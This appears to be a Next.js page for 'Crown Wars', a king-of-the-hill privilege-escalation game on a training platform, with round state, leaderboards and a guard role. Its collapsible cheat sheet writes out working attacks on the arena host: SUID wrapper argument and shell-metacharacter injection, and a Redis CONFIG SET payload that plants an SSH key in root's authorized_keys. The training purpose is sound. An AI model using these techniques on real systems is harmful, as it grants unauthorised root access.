import Link from "next/link";
import { and, desc, eq } from "drizzle-orm";
import { getCurrentSession } from "@/lib/auth/session";
import { db } from "@/lib/db/client";
import { kothEvents, kothRounds, users } from "@/lib/db/schema";
import {
  findKeyForUser,
  findRoundSlotForUser,
} from "@/lib/koth/keys";
import { topNForRound } from "@/lib/koth/scoring";
import { currentPricesForRound, listPaths } from "@/lib/koth/paths";
import { getLifetimeStatsForUsers } from "@/lib/koth/honors";
import { titleFromRoundWins } from "@/lib/koth/titles";
import { secondsUntilNextSeed, todayUtcString } from "@/lib/koth/daily";
import {
  LOCKDOWN_WINDOW_SEC,
  getActiveLockdowns,
  getGuardForRound,
  guardHasUsedHeal,
  guardHasUsedLockdown,
  hasFirstCrownBeenTaken,
  isUserGuardForRound,
} from "@/lib/koth/guards";
import { recentAudit } from "@/lib/koth/audit";
import { DECAY_GRACE_SEC } from "@/lib/koth/scoring";
import { getOrCreateMutationForRound } from "@/lib/koth/mutations";
import {
  joinKothRound,
  submitKothKey,
  claimGuardAction,
  placeLockdownAction,
  placeHealAction,
} from "./actions";
import { RealtimeRefresh } from "./RealtimeRefresh";
import { AuditFeed } from "@/components/koth/AuditFeed";

export const dynamic = "force-dynamic";
export const revalidate = 0;

const ROUND_DURATION_SECONDS = 30 * 60;
const ARENA_HOST = "204.168.229.209";
const ARENA_PORT = 2300;
const ESCALATION_THRESHOLD_SECONDS = 300;

// Daily challenge — days since the feature shipped. Today (2026-05-18)
// is Daily #1; #2 fires at the next UTC midnight, etc. Mirrors
// /battles/koth/daily and lib/koth/daily.ts.
const DAILY_EPOCH = new Date("2026-05-18T00:00:00Z").getTime();
function dailyChallengeNumber(day: string): number {
  const d = new Date(day + "T00:00:00Z").getTime();
  return Math.max(1, Math.floor((d - DAILY_EPOCH) / 86400_000) + 1);
}

function fmtHHMMSS(sec: number): string {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = sec % 60;
  return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
}

type EventMeta = { value_snapshot?: number };
function snapOf(raw: unknown): number | null {
  if (!raw || typeof raw !== "object") return null;
  const v = (raw as EventMeta).value_snapshot;
  return typeof v === "number" ? v : null;
}

function fmtDuration(seconds: number): string {
  const s = Math.max(0, seconds);
  const m = Math.floor(s / 60);
  const r = s % 60;
  return `${m}:${r.toString().padStart(2, "0")}`;
}

async function loadState() {
  const [round] = await db
    .select({
      id: kothRounds.id,
      startedAt: kothRounds.startedAt,
      engagedAt: kothRounds.engagedAt,
    })
    .from(kothRounds)
    .where(eq(kothRounds.status, "active"))
    .orderBy(desc(kothRounds.startedAt))
    .limit(1);

  if (!round) {
    return {
      round: null,
      king: null,
      top5: [],
      feed: [],
      paths: [] as Awaited<ReturnType<typeof currentPricesForRound>>,
      escalationEtaSec: null as number | null,
    };
  }

  // engaged_at IS NULL = arena standing by. Clock doesn't tick until
  // the first crown_taken.
  const engaged = round.engagedAt !== null;
  const ageSeconds = engaged
    ? Math.max(
        0,
        Math.floor((Date.now() - round.engagedAt!.getTime()) / 1000),
      )
    : 0;

  // Scope king detection to the current round only — see
  // api/koth/state/route.ts for the same fix. A global lookup leaks
  // the last king from a closed round into the next standing-by round.
  const [kingEvent] = await db
    .select({
      occurredAt: kothEvents.occurredAt,
      exploitPath: kothEvents.exploitPath,
      username: users.username,
    })
    .from(kothEvents)
    .leftJoin(users, eq(users.id, kothEvents.actorUserId))
    .where(
      and(
        eq(kothEvents.kind, "crown_taken"),
        eq(kothEvents.roundId, round.id),
      ),
    )
    .orderBy(desc(kothEvents.occurredAt))
    .limit(1);

  // King's last patch — used to display Crown Decay status. NULL if
  // they haven't patched anything yet during this tenure.
  let kingLastPatchAt: Date | null = null;
  if (kingEvent && kingEvent.username) {
    const kingActorId = await db
      .select({ id: kothEvents.actorUserId })
      .from(kothEvents)
      .leftJoin(users, eq(users.id, kothEvents.actorUserId))
      .where(
        and(
          eq(kothEvents.kind, "crown_taken"),
          eq(kothEvents.roundId, round.id),
        ),
      )
      .orderBy(desc(kothEvents.occurredAt))
      .limit(1);
    const kingId = kingActorId[0]?.id ?? null;
    if (kingId) {
      const lastPatchRow = await db
        .select({ occurredAt: kothEvents.occurredAt })
        .from(kothEvents)
        .where(
          and(
            eq(kothEvents.actorUserId, kingId),
            eq(kothEvents.roundId, round.id),
            // patched OR path_patched_attributed — but Drizzle's
            // typed where doesn't union easily; we query for the
            // attributed kind first and fall back to "patched" if
            // none. The most recent of either is what matters.
            eq(kothEvents.kind, "patched"),
          ),
        )
        .orderBy(desc(kothEvents.occurredAt))
        .limit(1);
      // Phase D — Crown Heal also resets the decay timer. heal events
      // are inserted with target_user_id = king's user id, so we look
      // up by that (not actor_user_id which is the guard).
      const lastHealRow = await db
        .select({ occurredAt: kothEvents.occurredAt })
        .from(kothEvents)
        .where(
          and(
            eq(kothEvents.targetUserId, kingId),
            eq(kothEvents.roundId, round.id),
            eq(kothEvents.kind, "guard_heal"),
          ),
        )
        .orderBy(desc(kothEvents.occurredAt))
        .limit(1);
      const lastAttributedRow = await db
        .select({ occurredAt: kothEvents.occurredAt })
        .from(kothEvents)
        .where(
          and(
            eq(kothEvents.actorUserId, kingId),
            eq(kothEvents.roundId, round.id),
            eq(kothEvents.kind, "path_patched_attributed"),
          ),
        )
        .orderBy(desc(kothEvents.occurredAt))
        .limit(1);
      const a = lastPatchRow[0]?.occurredAt ?? null;
      const b = lastAttributedRow[0]?.occurredAt ?? null;
      const c = lastHealRow[0]?.occurredAt ?? null;
      const candidates = [a, b, c].filter((d): d is Date => d != null);
      kingLastPatchAt = candidates.length
        ? candidates.reduce((m, d) => (d > m ? d : m))
        : null;
      // Only count patches AFTER the king's current tenure started.
      if (kingLastPatchAt && kingLastPatchAt < kingEvent.occurredAt) {
        kingLastPatchAt = null;
      }
    }
  }

  const king =
    kingEvent && kingEvent.username
      ? {
          username: kingEvent.username,
          since: kingEvent.occurredAt,
          lastPatchAt: kingLastPatchAt,
          holdSeconds: Math.max(
            0,
            Math.floor((Date.now() - kingEvent.occurredAt.getTime()) / 1000),
          ),
          exploitPath: kingEvent.exploitPath,
        }
      : null;

  const top5 = await topNForRound(round.id, 5);

  const feedRows = await db
    .select({
      occurredAt: kothEvents.occurredAt,
      kind: kothEvents.kind,
      exploitPath: kothEvents.exploitPath,
      actorUsername: users.username,
      rawMeta: kothEvents.rawMeta,
    })
    .from(kothEvents)
    .leftJoin(users, eq(users.id, kothEvents.actorUserId))
    .where(eq(kothEvents.roundId, round.id))
    .orderBy(desc(kothEvents.occurredAt))
    .limit(10);

  const feed = feedRows.map((r) => {
    const ts = r.occurredAt.toISOString().slice(11, 19);
    const actor = r.actorUsername ?? "unknown";
    const snap = snapOf(r.rawMeta);
    const v = snap != null ? ` (+${snap} pt)` : "";
    const path = r.exploitPath ? ` via ${r.exploitPath}${v}` : "";
    let line: string;
    switch (r.kind) {
      case "crown_taken":
        line = `${actor} took the crown${path}`;
        break;
      case "patched":
        line = `${actor} patched ${r.exploitPath ?? "an exploit"}`;
        break;
      case "path_patched_attributed":
        line = `${actor} closed ${r.exploitPath} (path-attributed +5)`;
        break;
      case "escalated":
        line = `escalation: new path open${path}`;
        break;
      case "path_activated":
        line = `new path opened: ${r.exploitPath ?? "?"}`;
        break;
      case "tutorial":
        line = `${actor} cleared the tutorial`;
        break;
      default:
        line = `${actor} ${r.kind}${path}`;
    }
    return { ts, line, kind: r.kind };
  });

  const paths = await currentPricesForRound(round.id);
  const escalationEtaSec =
    king && king.holdSeconds < ESCALATION_THRESHOLD_SECONDS
      ? ESCALATION_THRESHOLD_SECONDS - king.holdSeconds
      : null;

  return {
    round: {
      id: round.id,
      engaged,
      ageSeconds,
      remainingSeconds: engaged
        ? Math.max(0, ROUND_DURATION_SECONDS - ageSeconds)
        : ROUND_DURATION_SECONDS,
    },
    king,
    top5,
    feed,
    paths,
    escalationEtaSec,
  };
}

export const metadata = {
  title: "Crown Wars — Predator Arena · BreachLab",
};

export default async function KothPage({
  searchParams,
}: {
  searchParams: Promise<{ error?: string; registered?: string }>;
}) {
  const { user } = await getCurrentSession();
  const params = await searchParams;
  const state = await loadState();

  const myKey = user ? await findKeyForUser(user.id) : null;
  // The slot is now per-round. A returning operator whose previous
  // round closed has a key but no slot in the current round — they
  // need to click "Join this round" to claim one.
  const mySlot =
    user && state.round
      ? await findRoundSlotForUser(user.id, state.round.id)
      : null;

  // Lifetime totals for the operators on the leaderboard so the row
  // can flex "× 12 round wins · 47 crowns" next to a current-round
  // point count. One batched query for all 5 visible names.
  const lifetimeStats = await getLifetimeStatsForUsers(
    state.top5.map((r) => r.userId),
  );

  const pendingEscalation = state.paths.filter(
    (p) => p.kind === "escalation" && !p.activated && p.pendingUntil !== null,
  );

  const todayDay = todayUtcString();
  const todayChallenge = dailyChallengeNumber(todayDay);
  const secsToNextDaily = secondsUntilNextSeed();

  // Drift Mode — per-round mutation scheme. Phase A is purely
  // informational; cheat-sheet wiring + arena-side renames are Phase B.
  const drift = state.round
    ? await getOrCreateMutationForRound(state.round.id)
    : null;

  // Crown Decay + King's Guard surface
  const guard = state.round
    ? await getGuardForRound(state.round.id)
    : null;
  const iAmGuard =
    user && state.round
      ? await isUserGuardForRound(user.id, state.round.id)
      : false;
  // Phase B: gate Guard claim on game-start + surface Lockdown state.
  const gameStarted = state.round
    ? await hasFirstCrownBeenTaken(state.round.id)
    : false;
  const activeLockdowns = state.round
    ? await getActiveLockdowns(state.round.id)
    : [];
  const guardUsedLockdown =
    iAmGuard && user && state.round
      ? await guardHasUsedLockdown(state.round.id, user.id)
      : false;
  // Catalog rows the guard can pick from when placing a lockdown.
  // Filter to escalation primitives so the choice is "which active
  // exploit path", not housekeeping/core kinds.
  const lockdownCandidates =
    iAmGuard && !guardUsedLockdown
      ? (await listPaths()).filter((p) => p.kind === "escalation")
      : [];
  // Phase D — Heal token state (1 per round per guard).
  const guardUsedHeal =
    iAmGuard && user && state.round
      ? await guardHasUsedHeal(state.round.id, user.id)
      : false;
  // Phase C — Eye of the Guard. Last 30 audit events across ALL slots
  // (not just king), only fetched when the viewer is the guard. The
  // existing public AuditFeed widget is king-only; Eye gives the
  // guard the full picture: which attacker is doing what, when.
  const eyeFeed =
    iAmGuard && state.round
      ? await recentAudit({ roundId: state.round.id, limit: 30 })
      : [];

  // King is in decay if their last patch was >5min ago AND tenure
  // itself is > 5min (we give a grace period at tenure start).
  const kingDecayElapsed =
    state.king
      ? state.king.lastPatchAt
        ? Math.floor(
            (Date.now() - state.king.lastPatchAt.getTime()) / 1000,
          )
        : state.king.holdSeconds
      : 0;
  const kingDecaying =
    state.king !== null &&
    state.king.holdSeconds > DECAY_GRACE_SEC &&
    kingDecayElapsed > DECAY_GRACE_SEC;
  const decaySecondsTillKickIn = state.king
    ? Math.max(0, DECAY_GRACE_SEC - kingDecayElapsed)
    : 0;

  return (
    <article className="space-y-5 max-w-3xl" data-testid="koth-page">
      <RealtimeRefresh intervalMs={3000} />

      {/* Hero */}
      <header className="space-y-2">
        <div className="text-[10px] text-amber/80 tracking-[0.4em] uppercase font-mono">
          ▸ predator arena
        </div>
        <h1 className="text-amber text-3xl sm:text-4xl phosphor wordmark font-bold tracking-[0.08em]">
          <span className="glitch" data-text="CROWN WARS">
            CROWN WARS
          </span>
        </h1>
      </header>

      {/* Quick-nav buttons — bordered for affordance, amber on hover. */}
      <nav className="flex flex-wrap items-center gap-2 text-[11px] font-mono">
        <Link
          href="/battles/koth/daily"
          className="border border-amber/40 hover:border-amber hover:bg-amber/[0.06] transition-colors px-3 py-1.5 text-amber tracking-[0.18em] uppercase"
        >
          ▸ daily #{todayChallenge}
          <span className="text-muted/80 normal-case tabular-nums ml-1 tracking-normal">
            · {fmtHHMMSS(secsToNextDaily)}
          </span>
        </Link>
        <Link
          href="/battles/koth/replays"
          className="border border-amber/40 hover:border-amber hover:bg-amber/[0.06] transition-colors px-3 py-1.5 text-amber/90 tracking-[0.18em] uppercase"
        >
          ▸ replays &amp; race
        </Link>
        <Link
          href="/battles/koth/rules"
          className="ml-auto border border-muted/40 hover:border-amber hover:text-amber transition-colors px-3 py-1.5 text-muted tracking-[0.18em] uppercase"
        >
          rules →
        </Link>
      </nav>

      {/* King-only decay alert — only visible to the user CURRENTLY
          holding the crown when they're inside the grace window or
          already decaying. Tells them to patch something now. */}
      {state.king &&
        user &&
        state.king.username === user.username &&
        (kingDecaying ||
          (state.king.lastPatchAt !== null &&
            decaySecondsTillKickIn > 0 &&
            decaySecondsTillKickIn < 120)) && (
          <div
            className={`border ${
              kingDecaying
                ? "border-red-400/60 bg-red-400/[0.06]"
                : "border-amber/40 bg-amber/[0.05]"
            } px-4 py-2.5 font-mono text-[12px] flex items-center justify-between gap-3 flex-wrap`}
          >
            <span
              className={kingDecaying ? "text-red-400" : "text-amber"}
            >
              {kingDecaying
                ? "▼ crown decaying — patch a path"
                : `◷ ${decaySecondsTillKickIn}s until decay`}
            </span>
          </div>
        )}

      {/* ─── Combined Arena Console ───────────────────────────────
          Round status strip (top) + enlist / SSH / sign-in (body).
          Border switches to green when the viewer is enlisted, giving
          a clear "you're in" identity signal across the whole console. */}
      <section
        className={`border ${
          mySlot
            ? "border-green/40 bg-green/[0.03]"
            : "border-amber/40 bg-amber/[0.03]"
        }`}
      >
        {/* Round status strip */}
        <div
          className={`border-b ${
            mySlot ? "border-green/20" : "border-amber/20"
          } px-4 py-2.5 flex items-center gap-3 flex-wrap text-[11px] font-mono tabular-nums`}
        >
          {state.round ? (
            state.round.engaged ? (
            <>
              <span className="flex items-center gap-2">
                <span className="pulse-dot text-green">●</span>
                <span className="text-muted uppercase tracking-widest">
                  round live
                </span>
              </span>
              <span className="text-amber">
                age {fmtDuration(state.round.ageSeconds)} / 30:00
              </span>
              <span className="text-muted">·</span>
              {state.king ? (
                <span className="text-green">
                  king: {state.king.username} ·{" "}
                  {fmtDuration(state.king.holdSeconds)}
                  {kingDecaying && (
                    <>
                      {" "}
                      <span
                        className="text-red-400 animate-pulse"
                        title="King hasn't closed a path in 5+ minutes — hold-time points are decaying."
                      >
                        ▼ decaying
                      </span>
                    </>
                  )}
                  {!kingDecaying &&
                    state.king.lastPatchAt !== null &&
                    decaySecondsTillKickIn > 0 &&
                    decaySecondsTillKickIn < 60 && (
                      <>
                        {" "}
                        <span className="text-amber/70" title="Decay timer">
                          ◷ {decaySecondsTillKickIn}s
                        </span>
                      </>
                    )}
                </span>
              ) : (
                <span className="text-muted">crown vacant</span>
              )}
              {state.escalationEtaSec !== null && state.king && (
                <>
                  <span className="text-muted">·</span>
                  <span className="text-red-400">
                    escalation in {fmtDuration(state.escalationEtaSec)}
                  </span>
                </>
              )}
              {pendingEscalation.length > 0 && (
                <>
                  <span className="text-muted">·</span>
                  <span className="text-red-400 animate-pulse">
                    ⚠ incoming: {pendingEscalation.map((p) => p.slug).join(", ")}
                  </span>
                </>
              )}
            </>
            ) : (
              <>
                <span className="flex items-center gap-2">
                  <span className="text-amber/70">○</span>
                  <span className="text-muted uppercase tracking-widest">
                    arena standing by
                  </span>
                </span>
                <span className="text-muted">·</span>
                <span className="text-text">
                  clock starts on the first crown grab
                </span>
                <span className="text-muted">·</span>
                <span className="text-amber/80">round: 30:00 fresh</span>
              </>
            )
          ) : (
            <span className="text-muted">
              arena resetting · no active round
            </span>
          )}
        </div>

        {/* Body — three states: unsigned / enlisted / sign-in-but-no-key */}
        {!user ? (
          <div className="px-4 py-3 space-y-2">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ enlist
            </div>
            <p className="text-[13px] text-text">
              Sign in to register your SSH key and claim a slot in the arena.
            </p>
            <Link
              href="/login?next=/battles/koth"
              className="btn-bracket text-amber text-[12px] font-mono"
            >
              Sign in to enlist
            </Link>
          </div>
        ) : myKey && mySlot ? (
          <div className="px-4 py-3 space-y-2">
            <div className="flex items-center justify-between gap-3 flex-wrap">
              <div className="flex items-center gap-2 text-[10px] tracking-[0.3em] uppercase font-mono">
                <span className="text-green/80">
                  ▸ enlisted · slot koth{mySlot.slot}
                </span>
                {myKey.tutorialCompletedAt ? (
                  <span className="border border-amber/60 text-amber bg-amber/5 px-1 py-0">
                    veteran
                  </span>
                ) : (
                  <span className="border border-muted/60 text-muted bg-bg px-1 py-0">
                    rookie · first crown unlocks
                  </span>
                )}
              </div>
              <span className="text-[10px] text-muted font-mono tabular-nums">
                {myKey.fingerprint.slice(0, 22)}…
              </span>
            </div>
            <pre className="text-[12px] leading-relaxed text-text overflow-x-auto">
{`ssh -i ~/.ssh/your_key -p ${ARENA_PORT} koth${mySlot.slot}@${ARENA_HOST}`}
            </pre>
            <p className="text-[10px] text-muted/80 leading-snug -mt-1">
              Your key syncs to the arena every ~60s. If the first
              <code className="mx-1">ssh</code>
              hits <em>permission denied</em>, give it a minute and retry.
            </p>
            <p className="text-[11px] text-muted leading-snug">
              Once inside: get root via the SUID paths or Redis, then
              <code className="ml-1">
                crown-claim koth{mySlot.slot} &lt;exploit&gt;
              </code>{" "}
              to claim the throne.
            </p>

            {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
            <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
              <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
                ▸ exploit cheat sheet · open at your own risk
              </summary>
              <div className="space-y-3 pt-2 pb-1">
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    suid-python-wrapper · argv code injection
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
{`/usr/local/bin/phantom-python3 -c \\
  'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")'`}
                  </pre>
                </div>
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    suid-shell-injection · shell metachar through SUID wrapper
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
{`/usr/local/bin/system-checker \\
  '127.0.0.1; crown-claim koth${mySlot.slot} suid-shell-injection'`}
                  </pre>
                </div>
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    redis-config-set-dir · write authorized_keys via redis-cli
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
{`ssh-keygen -t ed25519 -f /tmp/k -N ''
KEY=$(cat /tmp/k.pub)
redis-cli <<EOF
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\\n\\n$KEY\\n\\n"
SAVE
EOF
ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
  "crown-claim koth${mySlot.slot} redis-config-set-dir"`}
                  </pre>
                </div>
                <p className="text-[10px] text-muted leading-snug pt-1">
                  Paths rotate per round. <code>which</code> if a 404 hits.
                </p>
              </div>
            </details>
          </div>
        ) : myKey ? (
          // Operator has a registered key but no slot in the current
          // round — happens after a round close. Single-click claim.
          <div className="px-4 py-3 space-y-3">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ welcome back — claim your slot for this round
            </div>
            {params.error && (
              <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
                ✗ {params.error}
              </div>
            )}
            <p className="text-[12px] text-muted leading-snug">
              Slots are now per-round (max 10). Your SSH key is on
              file — one click and you&apos;re in. Slots release on
              every round close so new operators always have a path
              in.
            </p>
            <form action={joinKothRound}>
              <button
                type="submit"
                className="btn-bracket text-amber text-[12px] font-mono"
              >
                Join this Round
              </button>
            </form>
          </div>
        ) : (
          <div className="px-4 py-3 space-y-3">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ enlist — register your SSH key
            </div>
            {params.error && (
              <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
                ✗ {params.error}
              </div>
            )}
            {params.registered === "1" && (
              <div className="text-[12px] text-green font-mono border border-green/40 bg-green/5 px-2 py-1">
                ✓ key registered — slot assigned above
              </div>
            )}
            <form action={submitKothKey} className="space-y-2">
              <textarea
                id="pubkey"
                name="pubkey"
                rows={3}
                required
                placeholder="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... your@host"
                className="w-full bg-bg border border-amber/30 px-3 py-2 text-[12px] font-mono text-text resize-y focus:outline-none focus:border-amber"
              />
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <span className="text-[10px] text-muted">
                  generate with <code>ssh-keygen -t ed25519</code> · paste the
                  .pub
                </span>
                <button
                  type="submit"
                  className="btn-bracket text-amber text-[12px] font-mono"
                >
                  Enlist in Arena
                </button>
              </div>
            </form>
          </div>
        )}
      </section>

      {/* King's Guard — asymmetric defender role. Single slot per
          round, FCFS; scores ½ of the king's active hold-time per
          minute. Phase B: gated on first crown_taken + can burn one
          Lockdown token per round. */}
      {state.round && (
        <div className="border border-border/60 px-4 py-2 space-y-2 font-mono text-[11px]">
          <div className="flex items-center justify-between gap-3 flex-wrap">
            <div className="flex items-center gap-2">
              <span className="text-amber/80 tracking-[0.18em] uppercase">
                ▸ king&apos;s guard
              </span>
              {guard ? (
                <span className="text-text">
                  <span className="text-amber/90">@{guard.username ?? "anon"}</span>
                </span>
              ) : gameStarted ? (
                <span className="text-muted">slot open · ½ of king&apos;s hold</span>
              ) : (
                <span className="text-muted/70">
                  awaits first crown · slot opens once the round engages
                </span>
              )}
            </div>
            {user && !guard && !iAmGuard && gameStarted && (
              <form action={claimGuardAction}>
                <button
                  type="submit"
                  className="border border-amber/40 hover:border-amber hover:bg-amber/[0.06] transition-colors px-3 py-1 text-amber tracking-[0.18em] uppercase text-[11px]"
                >
                  claim →
                </button>
              </form>
            )}
            {iAmGuard && (
              <span className="text-green/80 tracking-[0.18em] uppercase">
                ▸ you are the guard
              </span>
            )}
          </div>

          {/* Lockdown form — only the active guard sees this, and only
              before they've burned their token for the round. */}
          {iAmGuard && !guardUsedLockdown && lockdownCandidates.length > 0 && (
            <form
              action={placeLockdownAction}
              className="flex items-center gap-2 flex-wrap pt-1 border-t border-border/40"
            >
              <span className="text-red-400/80 tracking-[0.18em] uppercase text-[10px]">
                ▸ lockdown (1 token · {Math.floor(LOCKDOWN_WINDOW_SEC / 60)}min):
              </span>
              <select
                name="pathSlug"
                defaultValue=""
                required
                className="bg-bg border border-border/40 text-text px-2 py-1 text-[11px] font-mono"
              >
                <option value="" disabled>
                  pick a primitive…
                </option>
                {lockdownCandidates.map((p) => (
                  <option key={p.slug} value={p.slug}>
                    {p.name} ({p.slug})
                  </option>
                ))}
              </select>
              <button
                type="submit"
                className="border border-red-400/60 text-red-400 hover:bg-red-400/10 transition-colors px-3 py-1 tracking-[0.18em] uppercase text-[11px]"
              >
                lock down →
              </button>
            </form>
          )}
          {iAmGuard && guardUsedLockdown && (
            <p className="text-[10px] text-muted/80 italic pt-1 border-t border-border/40">
              ▸ lockdown token spent for this round — resets next round.
            </p>
          )}

          {/* Phase D — Crown Heal. Single button; resets king's decay
              grace window. Only visible when there IS a king to heal
              and the guard hasn't already used their token. */}
          {iAmGuard && !guardUsedHeal && state.king && (
            <form
              action={placeHealAction}
              className="flex items-center gap-2 flex-wrap pt-1 border-t border-border/40"
            >
              <span className="text-green/80 tracking-[0.18em] uppercase text-[10px]">
                ▸ heal (1 token):
              </span>
              <span className="text-muted text-[11px]">
                reset decay on @{state.king.username} — gives them 5min grace
              </span>
              <button
                type="submit"
                className="border border-green/60 text-green hover:bg-green/10 transition-colors px-3 py-1 tracking-[0.18em] uppercase text-[11px] ml-auto"
              >
                heal king →
              </button>
            </form>
          )}
          {iAmGuard && guardUsedHeal && (
            <p className="text-[10px] text-muted/80 italic pt-1 border-t border-border/40">
              ▸ heal token spent for this round — resets next round.
            </p>
          )}

          {/* Phase C — Eye of the Guard. Last 30 syscalls across ALL
              slots, not just king. The public AuditFeed shows only
              the king's activity; Eye gives the guard the full picture
              so they can time Lockdown/Heal under coordinated attacks. */}
          {iAmGuard && (
            <div className="pt-2 border-t border-border/40">
              <div className="flex items-center justify-between mb-1">
                <span className="text-amber/80 tracking-[0.18em] uppercase text-[10px]">
                  👁 eye of the guard · live intel
                </span>
                <span className="text-muted/60 text-[10px]">
                  all slots · refresh 3s
                </span>
              </div>
              {eyeFeed.length === 0 ? (
                <p className="text-[10.5px] text-muted/70 italic">
                  no arena activity yet — feed lights up when attackers start moving.
                </p>
              ) : (
                <ul className="space-y-0.5 max-h-48 overflow-y-auto text-[10.5px] leading-[1.45] font-mono tabular-nums">
                  {eyeFeed
                    .slice()
                    .reverse()
                    .map((line) => (
                      <li
                        key={line.id}
                        className="flex items-baseline gap-2"
                      >
                        <span className="text-amber/60 w-12 shrink-0">
                          {line.occurredAt.toISOString().slice(11, 19)}
                        </span>
                        <span className="text-amber/80 w-12 shrink-0">
                          [{line.actorSlot ?? "?"}]
                        </span>
                        <span
                          className={
                            line.syscallClass === "execve"
                              ? "text-amber"
                              : line.syscallClass === "setuid"
                                ? "text-red-400"
                                : line.syscallClass === "network"
                                  ? "text-blue-400"
                                  : "text-text/80"
                          }
                        >
                          {line.summary}
                        </span>
                      </li>
                    ))}
                </ul>
              )}
            </div>
          )}

          {/* Active lockdowns — public to everyone (attackers need to
              see what's frozen and switch primitives). */}
          {activeLockdowns.length > 0 && (
            <ul className="space-y-1 pt-1 border-t border-border/40">
              {activeLockdowns.map((ld) => {
                const remainSec = Math.max(
                  0,
                  Math.floor((ld.expiresAt.getTime() - Date.now()) / 1000),
                );
                const m = Math.floor(remainSec / 60);
                const s = remainSec % 60;
                return (
                  <li
                    key={ld.id}
                    className="flex items-center gap-2 flex-wrap text-[11px]"
                  >
                    <span className="text-red-400">🛡 LOCKED</span>
                    <code className="text-amber/90">{ld.pathSlug}</code>
                    <span className="text-muted">
                      · @{ld.guardUsername ?? "anon"}
                    </span>
                    <span className="text-red-400/80 ml-auto">
                      {m}:{s.toString().padStart(2, "0")} left
                      {ld.blockedCount > 0 && (
                        <span className="text-muted ml-2">
                          · {ld.blockedCount} blocked
                        </span>
                      )}
                    </span>
                  </li>
                );
              })}
            </ul>
          )}
        </div>
      )}

      {/* Top-5 leaderboard — hidden until there's something to show. */}
      {state.top5.length > 0 && (
        <section className="border border-border/60 px-4 py-3 space-y-2">
          <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
            ▸ top operators (this round)
          </h2>
          <ol className="space-y-1 text-[12px] font-mono tabular-nums">
            {state.top5.map((row, i) => {
              const life = lifetimeStats.get(row.userId);
              const title = life ? titleFromRoundWins(life.roundWins) : null;
              return (
                <li key={row.userId} className="flex items-center gap-3">
                  <span className="text-amber w-4">{i + 1}.</span>
                  <span className="text-text flex-1 truncate flex items-baseline gap-1.5">
                    {title && (
                      <span
                        className={`text-[9px] tracking-wider ${title.color}`}
                        title={`${life?.roundWins ?? 0} round wins · ${life?.crowns ?? 0} crowns · ${life?.dethrones ?? 0} dethrones`}
                      >
                        {title.glyph} {title.label}
                      </span>
                    )}
                    {row.username}
                    {life && life.roundWins > 0 && (
                      <span
                        className="text-[9px] text-muted/80 tracking-wider"
                        title="lifetime round wins"
                      >
                        ×{life.roundWins}
                      </span>
                    )}
                  </span>
                  <span className="text-amber w-12 text-right">{row.points} pt</span>
                  <span className="text-muted text-[10px] w-20 text-right">
                    {row.dethrones}d / {row.patches}p
                  </span>
                </li>
              );
            })}
          </ol>
        </section>
      )}

      {/* Live audit feed — outside-the-arena syscall stream of the
          current crown holder. Client island; subscribes to SSE on
          /api/koth/audit/stream. Survives king-as-root because the
          capture runs on the host PID namespace, not in the arena. */}
      <AuditFeed />

      {/* Kill-feed — hidden until there's something to show. */}
      {state.feed.length > 0 && (
        <section className="border border-border/60 px-4 py-3 space-y-2">
          <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
            ▸ kill feed
          </h2>
          <ul className="space-y-1 text-[12px] font-mono leading-relaxed">
            {state.feed.map((ev, i) => (
              <li key={i} className="flex gap-3">
                <span className="text-amber/70 tabular-nums w-16">{ev.ts}</span>
                <span className="text-text flex-1">{ev.line}</span>
              </li>
            ))}
          </ul>
        </section>
      )}

      <footer className="pt-3 border-t border-border/40 flex items-center justify-between text-xs text-muted font-mono gap-3 flex-wrap">
        <Link href="/battles" className="hover:text-amber tracking-[0.18em] uppercase">
          ← battles
        </Link>
        <div className="flex items-center gap-3">
          <Link href="/battles/koth/champions" className="hover:text-amber tracking-[0.18em] uppercase">
            champions
          </Link>
          <Link href="/battles/koth/history" className="hover:text-amber tracking-[0.18em] uppercase">
            history
          </Link>
        </div>
        <span className="tracking-[0.18em] uppercase">predator</span>
      </footer>
    </article>
  );
}
